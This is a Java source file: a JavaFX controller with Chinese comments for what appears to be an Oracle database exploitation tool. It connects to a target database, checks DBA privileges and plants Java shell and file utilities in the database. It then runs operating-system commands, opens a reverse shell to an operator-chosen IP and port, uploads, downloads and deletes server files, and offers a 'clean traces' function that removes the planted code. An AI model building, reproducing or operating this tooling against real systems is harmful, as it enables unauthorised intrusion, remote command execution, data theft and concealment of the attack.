package Controller;


import Dao.OracleDao;
import Entity.ControllersFactory;
import Entity.FilesEntity;
import Util.MessageUtil;
import Util.Utils;
import javafx.application.Platform;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.*;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.HBox;
import javafx.stage.DirectoryChooser;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import org.json.JSONObject;

import java.io.File;
import java.net.URL;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.ResourceBundle;

public class OracleController implements Initializable {

    @FXML
    private ComboBox<String> ComboBox_OracleFileTypeCode;

    @FXML
    private Button StartFileManagerBtn;

    @FXML
    private ComboBox<String> ComboBox_OracleTypeCode;

    @FXML
    private RadioButton RadioButton_JAVA;

    @FXML
    private RadioButton RadioButton_SCHEDULER;

    @FXML
    private Button Button_ReadPath;

    @FXML
    private Button Button_OracleCommandRun;

    @FXML
    private Button Button_DeleteFuction;

    @FXML
    private MenuItem MenuItem_upload;

    @FXML
    private MenuItem MenuItem_download;

    @FXML
    private MenuItem MenuItem_refresh;

    @FXML
    public TextArea oracleLogTextArea;

    @FXML
    private MenuItem CreateShellUtil;

    @FXML
    private MenuItem CreateFileUtil;

    @FXML
    private TextField TextField_OracleCommand;

    @FXML
    private HBox HBox_Command;

    @FXML
    private TextField TextField_FilePath;

    @FXML
    private TreeView<?> TreeView_PathTree;

    @FXML
    private Button Button_Return;

    @FXML
    private ToggleGroup OracleCommandTypeGroup;

    @FXML
    public TextArea Textarea_OracleCommandResult;

    @FXML
    private TableView<FilesEntity> TableView_Filetable;
    
    @FXML
    private MenuItem MenuItem_deletefile;

    @FXML
    private MenuButton MenuButton_CreateFunction;

    @FXML
    private Button reverseRunBtn;

    @FXML
    private TextField reversePortTextField;

    @FXML
    private TextField reverseAddressTextField;

    @FXML
    private ToggleGroup OracleReverseTypeGroup;

    @FXML
    private RadioButton reverseSchedulerRadioBtn;

    @FXML
    private RadioButton reverseJavaRadioBtn;


    @FXML
    private TableColumn<?, ?> fileSizeCol;

    @FXML
    private TableColumn<?, ?> filePermissionCol;
    @FXML
    private TableColumn<?, ?> fileNameCol;

    @FXML
    private TableColumn<?, ?> fileTypeCol;

    @FXML
    private TableColumn<?, ?> fileStartTimeCol;
    @FXML
    private TableColumn<?, ?> fileIconCol;


    /**
     * 存储从 MssqlDao 传递过来的 mssqlDao 使用
     */
    private OracleDao oracleDao;

    private JSONObject dataObj;

    /**
     * 存放 RadioButton 的 userData 值
     */
    private String userData = "";

    private String reverseUserData = "";

    private List workList = new ArrayList();

    public List getWorkList() {
        return this.workList;
    }

    Image folderImage = new Image(getClass().getResourceAsStream("/images/folder.png"));
    Image fileImage = new Image(getClass().getResourceAsStream("/images/file.png"));
    ObservableList fileData = FXCollections.observableArrayList();

    public void initOraclelDao(JSONObject dbObj){
        this.dataObj = dbObj;
        oracleLogTextArea.appendText(Utils.log("正在连接..."));
    }


    @Override
    public void initialize(URL location, ResourceBundle resources) {
        // 初始化当前 controllers 。方便其他 controllers 调用
        ControllersFactory.controllers.put(this.getClass().getSimpleName(), this);

        // 监听 treeview 事件
        this.TreeView_PathTree.getSelectionModel().selectedItemProperty().addListener(new ChangeListener() {
            @Override
            public void changed(ObservableValue observable, Object oldValue, Object newValue) {
                TreeItem currentTreeItem = (TreeItem)newValue;
                if (currentTreeItem != null) {
                    // 从下往上寻找到root的路径
                    String path = getTreeViewsPath();
                    String code = ComboBox_OracleFileTypeCode.getValue();
                    selectFolder(currentTreeItem,path,code);
                }

            }
        });

        // 初始化对应组件
        initComboBox();
        initToggleGroup();
        initFilesTableViews();
        Runnable runner = () -> {
            try {
                this.oracleDao = new OracleDao(this.dataObj.getString("ipaddress"),this.dataObj.getString("port"),this.dataObj.getString("database"),this.dataObj.getString("username"),this.dataObj.getString("password"),this.dataObj.getString("timeout"));
                this.oracleDao.getConnection();
                Platform.runLater(() -> {
                    oracleLogTextArea.appendText(Utils.log("连接成功！"));
                    // 检查数据库账户权限
                    this.oracleDao.isDBA();
                    // 获取版本
                    this.oracleDao.getVersion();
                });
            }catch (Exception e){
                Platform.runLater(() -> {
                    oracleLogTextArea.appendText(Utils.log("连接失败！"));
                    MessageUtil.showExceptionMessage(e,e.getMessage());
                    try {
                        this.oracleDao.closeConnection();
                    }catch (Exception ex){
                    }
                });
            }
        };
        Thread workThrad = new Thread(runner);
        this.workList.add(workThrad);
        workThrad.start();
    }

    /**
     * 初始化 ToggleGroup 的 RadioButton 值
     */
    public void initToggleGroup(){

        RadioButton_JAVA.setUserData("java");
        RadioButton_SCHEDULER.setUserData("scheduler");
        reverseSchedulerRadioBtn.setUserData("schedulerreverse");
        reverseJavaRadioBtn.setUserData("javareverse");
        // 命令执行
        OracleCommandTypeGroup.selectedToggleProperty().addListener(
                (ObservableValue<? extends Toggle> ov, Toggle old_toggle,
                 Toggle new_toggle) -> {
                    if (OracleCommandTypeGroup.getSelectedToggle() != null) {
                        userData = OracleCommandTypeGroup.getSelectedToggle().getUserData().toString();
                        // 这里判断是否选择 scheduler 模式，scheduler 模式不需要编码和返回输出
                        // 只需要日志输出
                        if("scheduler".equals(userData)){
                            Textarea_OracleCommandResult.setText("该执行类型没有返回结果");
                            ComboBox_OracleTypeCode.setDisable(true);
                        }else {
                            Textarea_OracleCommandResult.setText("");
                            ComboBox_OracleTypeCode.setDisable(false);
                        }
                    }
                });
        // 反弹shell
        OracleReverseTypeGroup.selectedToggleProperty().addListener(
                (ObservableValue<? extends Toggle> ov, Toggle old_toggle,
                 Toggle new_toggle) -> {
                    if (OracleReverseTypeGroup.getSelectedToggle() != null) {
                        reverseUserData = OracleReverseTypeGroup.getSelectedToggle().getUserData().toString();
                    }
                });
    }

    /**
     * 初始化 ComboBox 组件
     */
    public void initComboBox(){
        // 编码
        ObservableList<String> OracleTypeCodeoptions = FXCollections.observableArrayList(
                "UTF-8",
                "GB2312",
                "GBK"
        );
        ComboBox_OracleFileTypeCode.setItems(OracleTypeCodeoptions);
        ComboBox_OracleFileTypeCode.setValue("UTF-8");
        ComboBox_OracleTypeCode.setItems(OracleTypeCodeoptions);
    }
    /**
     * 初始化 tableview 的所有绑定与事件
     */
    public void initFilesTableViews(){
        TableView_Filetable.setRowFactory((tv) -> {
            TableRow row = new TableRow();
            // tableviw 行双击事件
            row.setOnMouseClicked((event) -> {
                if (event.getClickCount() == 2 && !row.isEmpty()) {
                    // 获取当前路径
                    String currentPath = TextField_FilePath.getText();
                    // 获取文件类型
                    String fileType = this.TableView_Filetable.getSelectionModel().getSelectedItem().getFileType();
                    String fileName = this.TableView_Filetable.getSelectionModel().getSelectedItem().getFileName();
                    if("folder".equals(fileType)){
                        String code = ComboBox_OracleFileTypeCode.getValue();
                        currentPath = currentPath + fileName + "/";
                        TextField_FilePath.setText(currentPath);
                        showFilesOnTable(currentPath,code);
                    }
                }
            });
            return row;
        });
    }

    /**
     * 文件管理基本参数控件初始化
     */
    public void initFileManager(){
        try {
            //设置root节点
            TreeItem rootitem = new TreeItem<>();
            Image diskImage = new Image(getClass().getResourceAsStream("/images/disk.png"));
            //获取到磁盘个数
            ArrayList<String> disk = this.oracleDao.getDisk();
            // 如果是linux则不需要加 :/
            if("/".equals(disk.get(0))){
                //默认设置第一个盘为当前路径
                TextField_FilePath.setText(disk.get(0));
                for (int i = 0; i < disk.size(); i++) {
                    TreeItem<String> item = new TreeItem<> (disk.get(i),new ImageView(diskImage));
                    rootitem.getChildren().add(item);
                }
            }else {
                //默认设置第一个盘为当前路径
                TextField_FilePath.setText(disk.get(0) + ":/");
                for (int i = 0; i < disk.size(); i++) {
                    TreeItem<String> item = new TreeItem<> (disk.get(i) + ":/",new ImageView(diskImage));
                    rootitem.getChildren().add(item);
                }
            }

            TreeView_PathTree.setRoot(rootitem);
            TreeView_PathTree.setShowRoot(false);
            // 设置按钮为灰色
            StartFileManagerBtn.setDisable(true);
            oracleLogTextArea.appendText(Utils.log("文件功能开启成功!"));
            // 监听 tableview 双击事件
        }catch (Exception e){
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }
    /**
     * 用于左侧 treeview 的目录检索功能
     * @param treeItem
     * @param path
     * @param code
     */
    public void selectFolder(TreeItem treeItem,String path,String code){
        ArrayList<String> arrayFiles = new ArrayList<String>();
        // 设置路径
        TextField_FilePath.setText(path);
        // 清除旧数据
        treeItem.getChildren().clear();
        arrayFiles = this.oracleDao.getFiles(path,code);
        if("null".equals(arrayFiles.get(0))){
            oracleLogTextArea.appendText(Utils.log("路径读取失败！可能当前路径没有文件！"));
        }else {
            for (int i = 0; i < arrayFiles.size(); i++) {
                String file = arrayFiles.get(i);
                String[] arrfile = file.split("\t");
                // 0 是代表文件夹
                if(arrfile[0].contains("/")){
                    treeItem.getChildren().add(new TreeItem<>(arrfile[0].replace("/",""),new ImageView(folderImage)));
                }
            }
        }
        treeItem.setExpanded(true);
        showFilesOnTable(path,code);
        //treeItem.getChildren().add();

    }
    /**
     * 检索当前目录下的文件和文件夹并且输出到 tableview
     * @param path
     */
    public void showFilesOnTable(String path,String code){
        Runnable runnable = () -> {
            Platform.runLater(() -> {
                oracleLogTextArea.appendText(Utils.log("正在加载目录..."));
            });
            try {
                // 清除旧数据，防止数据叠加
                fileData.clear();
                ArrayList<String> arrayFiles = new ArrayList<String>();
                // 获取当前路径所有文件夹和文件
                arrayFiles = this.oracleDao.getFiles(path,code);
                if("null".equals(arrayFiles.get(0))){
                    oracleLogTextArea.appendText(Utils.log("路径读取失败！可能当前路径没有文件！"));
                }else {
                    for (int i = 0; i < arrayFiles.size(); i++) {
                        String file = arrayFiles.get(i);
                        String[] arrfile = file.split("\t");
                        // 文件夹或者文件名
                        String filename = arrfile[0] == null ? "" :arrfile[0];
                        String time = arrfile[1] == null ? "" :arrfile[1];
                        String size = arrfile[2] == null ? "" :arrfile[2];
                        String permission = arrfile[3] == null ? "" :arrfile[3];
                        // / 是目录
                        if(arrfile[0].contains("/")){
                            fileData.add(new FilesEntity(new ImageView(folderImage),filename.replace("/",""),time,size,
                                    permission,
                                    "folder"));
                        }else {
                            fileData.add(new FilesEntity(new ImageView(fileImage),filename,time,size,permission,"file"));
                        }
                    }
                }
                fileIconCol.setCellValueFactory(new PropertyValueFactory<>("fileIcon"));
                fileNameCol.setCellValueFactory(new PropertyValueFactory<>("fileName"));
                fileStartTimeCol.setCellValueFactory(new PropertyValueFactory<>("fileStartTime"));
                fileSizeCol.setCellValueFactory(new PropertyValueFactory<>("fileSize"));
                filePermissionCol.setCellValueFactory(new PropertyValueFactory<>("filePermission"));
                fileTypeCol.setCellValueFactory(new PropertyValueFactory<>("fileTypeCol"));
            }catch (Exception e){
                MessageUtil.showExceptionMessage(e, e.getMessage());
            }
            Platform.runLater(() -> {
                TableView_Filetable.setItems(fileData);
                oracleLogTextArea.appendText(Utils.log("目录加载完成！"));
            });
        };
        Thread workThrad = new Thread(runnable);
        workThrad.start();
    }
    /**
     * 获取 treeviews 的完整目录
     * @return
     */
    public String getTreeViewsPath(){
        TreeItem item = null;
        StringBuilder pathBuilder = new StringBuilder();
        for (item = TreeView_PathTree.getSelectionModel().getSelectedItem(); item != null ; item = item.getParent())
        {
            if(item.getValue() == null){
                continue;
            }
            pathBuilder.insert(0, item.getValue() + "/");

        }
        String path = pathBuilder.toString().replace("//","/");
        return path;
    }

    @FXML
    void CreateShellUtil(ActionEvent event) {
        Runnable runner = () -> {
            Platform.runLater(() -> {
                oracleLogTextArea.appendText(Utils.log("正在初始化，请稍等..."));
            });
            this.oracleDao.importShellUtilJAVA();
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();
    }

    @FXML
    void CreateFileUtil(ActionEvent event) {
        Runnable runner = () -> {
            Platform.runLater(() -> {
                oracleLogTextArea.appendText(Utils.log("正在初始化，请稍等..."));
            });
            this.oracleDao.importFileUtilJAVA();

        };
        Thread workThrad = new Thread(runner);
        workThrad.start();
    }


    @FXML
    void DeleteFuction(ActionEvent event) {
        Runnable runner = () -> {
            Platform.runLater(() -> {
                oracleLogTextArea.appendText(Utils.log("正在清理痕迹，请稍等..."));
            });
            this.oracleDao.deleteShellFunction();
            this.oracleDao.deleteFileFunction();
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();
    }

    @FXML
    void OracleCommandRun(ActionEvent event) {
        // 编码
        String code = ComboBox_OracleTypeCode.getValue();
        String command = TextField_OracleCommand.getText();

        if(code == null && !"scheduler".equals(userData)){
            MessageUtil.showErrorMessage("错误","请选择编码！");
            return;
        }else if("".equals(command)){
            MessageUtil.showErrorMessage("错误","请输入命令！");
            return;
        }else if("".equals(userData)){
            MessageUtil.showErrorMessage("错误","请选择命令执行类型！");
            return;
        }
        Runnable runner = () -> {
            Platform.runLater(() -> {
                oracleLogTextArea.appendText(Utils.log("正在执行命令，请稍等..."));
            });
            String res = this.oracleDao.executeCommand(command,code,userData);
            if(!"".equals(res)){
                Platform.runLater(() -> {
                    Textarea_OracleCommandResult.setText(res);
                });
            }
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();
    }

    @FXML
    void reverseRun(ActionEvent event) {
        if ("".equals(reverseAddressTextField)){
            MessageUtil.showErrorMessage("错误","请输入回连地址！");
            return;
        }else if("".equals(reversePortTextField)){
            MessageUtil.showErrorMessage("错误","请输入回连端口！");
            return;
        }else if("".equals(reverseUserData)){
            MessageUtil.showErrorMessage("错误","请选择回连模式！");
            return;
        }
        String ip = reverseAddressTextField.getText();
        String port = reversePortTextField.getText();
        if("javareverse".equals(reverseUserData)){
            Runnable runner = () -> {
                Platform.runLater(() -> {
                    oracleLogTextArea.appendText(Utils.log("正在执行反弹命令，请稍等..."));
                });
                this.oracleDao.reverseJavaShell(ip,port);
            };
            Thread workThrad = new Thread(runner);
            workThrad.start();
        }else {
            oracleLogTextArea.appendText(Utils.log("Scheduler 暂时不支持反弹！"));
        }
    }

    @FXML
    void StartFileManager(ActionEvent event) {
        Runnable runnable = () -> {
            try {
                Platform.runLater(() ->{
                    initFileManager();
                });
            } catch (Exception e) {
                Platform.runLater(() ->{
                    MessageUtil.showExceptionMessage(e,e.getMessage());
                });
            }
        };
        Thread workThrad = new Thread(runnable);
        workThrad.start();
    }

    @FXML
    void ReadPath(ActionEvent event) {
        Runnable runnable = () -> {
            try {
                String path = TextField_FilePath.getText();
                String code = ComboBox_OracleFileTypeCode.getValue();
                Platform.runLater(() ->{
                    showFilesOnTable(path,code);
                });
            } catch (Exception e) {
                Platform.runLater(() ->{
                    MessageUtil.showExceptionMessage(e,e.getMessage());
                });
            }
        };
        Thread workThrad = new Thread(runnable);
        workThrad.start();
    }

    @FXML
    void Return(ActionEvent event) {
        Runnable runnable = () -> {
            try {
                String path = TextField_FilePath.getText();
                String code = ComboBox_OracleFileTypeCode.getValue();
                path = Utils.getBeforePath(path);
                TextField_FilePath.setText(path);
                String finalPath = path;
                Platform.runLater(() ->{
                    showFilesOnTable(finalPath,code);
                });
            } catch (Exception e) {
                Platform.runLater(() ->{
                    MessageUtil.showExceptionMessage(e,e.getMessage());
                });
            }
        };
        Thread workThrad = new Thread(runnable);
        workThrad.start();
    }

    @FXML
    void Upload(ActionEvent event) {
        Stage stage = new Stage();
        if("".equals(TextField_FilePath.getText())){
            oracleLogTextArea.appendText(Utils.log("当前目录不存在！"));
            return;
        }
        FileChooser fileChooser = new FileChooser();
        File file = fileChooser.showOpenDialog(stage);
        if(file != null){
            Runnable runnable = () -> {
                Platform.runLater(() ->{
                    oracleLogTextArea.appendText(Utils.log("正在上传请稍等..."));
                });
                String res = null;
                res = Utils.binToHexString(file.getAbsolutePath());
                this.oracleDao.upload(TextField_FilePath.getText()+file.getName(),res);
                showFilesOnTable(TextField_FilePath.getText(),"");
            };
            Thread workThrad = new Thread(runnable);
            workThrad.start();
        }

    }

    @FXML
    void Delete(ActionEvent event) {
        try {
            String fileName = this.TableView_Filetable.getSelectionModel().getSelectedItem().getFileName();
            String fileType = this.TableView_Filetable.getSelectionModel().getSelectedItem().getFileType();
            if("folder".equals(fileType)){
                oracleLogTextArea.appendText(Utils.log("文件夹无法删除!"));
                return;
            }
            String code = ComboBox_OracleFileTypeCode.getValue();
            String path = TextField_FilePath.getText();
            Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
            alert.setTitle("Confirmation Dialog");
            alert.setHeaderText("");
            alert.setContentText("是否删除 " + fileName + "?");
            Optional<ButtonType> result = alert.showAndWait();
            if (result.get() == ButtonType.OK){
                Runnable runnable = () -> {
                    Platform.runLater(() ->{
                        oracleLogTextArea.appendText(Utils.log("正在删除请稍等..."));
                    });
                    try {
                        String temp = this.oracleDao.delete(path+fileName).replace("\n","");
                        if("success".equals(temp)){
                            Platform.runLater(() ->{
                                oracleLogTextArea.appendText(Utils.log("删除成功!"));
                            });
                        }else if ("fail".equals(temp)) {
                            Platform.runLater(() ->{
                                oracleLogTextArea.appendText(Utils.log("文件存在！但是删除失败!"));
                            });
                        } else {
                            Platform.runLater(() ->{
                                oracleLogTextArea.appendText(Utils.log("文件删除失败!"));
                            });
                        }
                        // 刷新目录
                        showFilesOnTable(path,code);
                    } catch (Exception e) {
                        Platform.runLater(() ->{
                            oracleLogTextArea.appendText(Utils.log("文件删除出错!"));
                            MessageUtil.showExceptionMessage(e,e.getMessage());
                        });
                    }
                };
                Thread workThrad = new Thread(runnable);
                workThrad.start();
            }
        }catch (Exception e){
        }
    }

    @FXML
    void download(ActionEvent event) {
        try {
            String code = ComboBox_OracleFileTypeCode.getValue();
            String fileName = this.TableView_Filetable.getSelectionModel().getSelectedItem().getFileName();
            String fileType = this.TableView_Filetable.getSelectionModel().getSelectedItem().getFileType();
            String path = TextField_FilePath.getText();
            if("folder".equals(fileType)){
                MessageUtil.showErrorMessage("错误","不能下载文件夹！");
                return;
            }
            if("".equals(TextField_FilePath.getText()) || "".equals(fileName)){
                MessageUtil.showErrorMessage("错误","当前文件不存在！");
                return;
            }
            DirectoryChooser dc = new DirectoryChooser();
            dc.setTitle("选择一个文件夹");
            File file = dc.showDialog(new Stage());
            if(file != null){
                //System.out.println(file.getAbsolutePath());
                Runnable runnable = () -> {
                    Platform.runLater(() ->{
                        oracleLogTextArea.appendText(Utils.log("正在下载请稍等..."));
                    });
                    try {
                        // 下载文本的hex数据
                        String res = this.oracleDao.download(path+fileName);
                        // 将 hex 数据转为 byte 数组
                        byte[] resByte = Utils.hexToByte(res);
                        // 写入到本地文件
                        Utils.writeFileByBytes(file.getAbsolutePath() + File.separator + fileName,resByte,false);
                        Platform.runLater(() ->{
                            oracleLogTextArea.appendText(Utils.log(fileName + " 下载成功!"));
                        });
                        // 刷新目录
                        showFilesOnTable(path,code);
                    } catch (Exception e) {
                        Platform.runLater(() ->{
                            oracleLogTextArea.appendText(Utils.log("下载失败!"));
                            MessageUtil.showExceptionMessage(e,e.getMessage());
                        });
                    }
                };
                Thread workThrad = new Thread(runnable);
                workThrad.start();
            }
        }catch (Exception e){
        }
    }

    @FXML
    void Refresh(ActionEvent event) {
        String path = TextField_FilePath.getText();
        String code = ComboBox_OracleFileTypeCode.getValue();
        Runnable runnable = () -> {
            try {
                showFilesOnTable(path,code);
                Platform.runLater(() ->{
                    oracleLogTextArea.appendText(Utils.log("刷新成功!"));
                });
            } catch (Exception e) {
                Platform.runLater(() ->{
                    MessageUtil.showExceptionMessage(e,e.getMessage());
                });
            }
        };
        Thread workThrad = new Thread(runnable);
        workThrad.start();
    }
}
